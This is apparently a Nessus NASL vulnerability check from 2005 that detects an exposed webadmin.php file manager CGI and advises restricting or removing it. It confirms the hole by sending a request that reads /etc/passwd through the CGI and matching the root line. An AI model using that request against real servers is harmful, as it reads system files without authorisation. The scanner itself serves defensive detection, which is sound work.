#
# (C) Michel Arboi <mikhail@nessus.org>
#


if(description)
{
 script_id(18586);
 script_version ("$Revision: 1.2 $");

 script_name(english: "webadmin.php detection");
 
 desc["english"] = "
webadmin.php was found on your web server. 
In its current configuration, this file manager CGI gives access 
to the whole filesystem of the machine to anybody.

Solution : Restrict access to this CGI or remove it
Risk factor : High";

 script_description(english:desc["english"]);
 script_summary(english: "Try to read /etc/passwd through webadmin.php");
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2005 Michel Arboi");
 script_family(english: "CGI abuses");
 script_dependencie("find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");

if (get_kb_item('http/auth')) exit(0);	# CGI might be protected

port = get_http_port(default:80);

if (get_kb_item('/tmp/http/auth/'+port)) exit(0);	# CGI might be protected

foreach dir (cgi_dirs())
{
 req = http_get(port: port, item: dir + '/webadmin.php?show=%2Fetc%2Fpasswd');
 r = http_keepalive_send_recv(port: port, data: req, bodyonly: 0);
 if (r =~ '^HTTP/1\\.[01] 200 ')
 {
   debug_print(dir+'/webadmin.php?show=%2Fetc%2Fpasswd = ', r);
   if (egrep(string: r, pattern: '^root:.*:0:[01]:'))
   {
     log_print('Found ', dir+'/webadmin.php\n');
     security_hole(port);
     exit(0);
    }
  }
}

# res = is_cgi_installed_ka(port:port, item:"webadmin.php");
# if (res) security_warning(port);
